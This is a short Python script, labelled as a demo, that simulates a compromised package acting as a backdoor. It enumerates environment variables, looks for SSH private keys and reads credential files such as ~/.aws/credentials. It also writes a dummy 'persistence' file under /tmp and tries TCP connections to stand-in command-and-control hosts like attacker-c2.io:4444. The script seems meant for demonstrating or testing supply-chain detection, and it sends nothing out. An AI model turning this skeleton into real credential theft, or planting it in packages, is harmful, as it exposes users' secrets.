#!/usr/bin/env python3
"""
MALICIOUS (DEMO): Python backdoor - demonstrating supply chain attack
This simulates a compromised package executing malicious code
"""

import base64
import os
import socket
import sys

print("[Backdoor] Initializing remote shell...")

# Access sensitive environment variables
print("[Backdoor] Exfiltrating environment...")
sensitive_vars = {}
for key in ['HOME', 'USER', 'PATH', 'SHELL', 'TERM']:
    if key in os.environ:
        sensitive_vars[key] = os.environ[key]
        print(f"[Backdoor] Found {key}={os.environ[key][:20]}...")

# Try to read SSH keys
print("[Backdoor] Attempting credential theft...")
ssh_keys = []
ssh_dir = os.path.expanduser("~/.ssh")
if os.path.exists(ssh_dir):
    try:
        for file in os.listdir(ssh_dir):
            if file.endswith(("id_rsa", "id_ed25519", "id_dsa")):
                print(f"[Backdoor] Found SSH key: {file}")
                ssh_keys.append(file)
    except PermissionError:
        print("[Backdoor] SSH directory not readable")

# Try to read .env files
print("[Backdoor] Searching for configuration files...")
config_files = ['.env', '.env.local', '.aws/credentials', '.docker/config.json']
for config in config_files:
    config_path = os.path.expanduser(f"~/{config}")
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                content = f.read()
                print(f"[Backdoor] Found config: {config} ({len(content)} bytes)")
        except PermissionError:
            print(f"[Backdoor] Cannot read {config}")

# Try to write malicious file
print("[Backdoor] Installing persistence mechanism...")
try:
    persist_dir = "/tmp/.persistent_backdoor"
    os.makedirs(persist_dir, exist_ok=True)
    with open(f"{persist_dir}/agent.bin", "w") as f:
        f.write(base64.b64encode(b"malicious payload").decode())
    print(f"[Backdoor] Backdoor installed to: {persist_dir}")
except Exception as e:
    print(f"[Backdoor] Installation failed: {e}")

# Try to connect to command & control server
print("[Backdoor] Attempting C&C connection...")
c2_servers = [
    "attacker-c2.io:4444",
    "evil-domain.xyz:443",
    "192.168.1.100:8888"
]

for c2 in c2_servers:
    try:
        host, port = c2.split(':')
        print(f"[Backdoor] Connecting to C&C: {c2}")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((host, int(port)))
        print(f"[Backdoor] Connected to {c2}!")
        sock.close()
    except (socket.gaierror, socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"[Backdoor] C&C unreachable ({e.strerror if hasattr(e, 'strerror') else str(e)})")

print("[Backdoor] Backdoor initialization complete")
print("[Backdoor] Ready to receive commands from C&C...")

# Wait briefly to simulate daemon
import time
time.sleep(1)

print("[Backdoor] Exiting...")
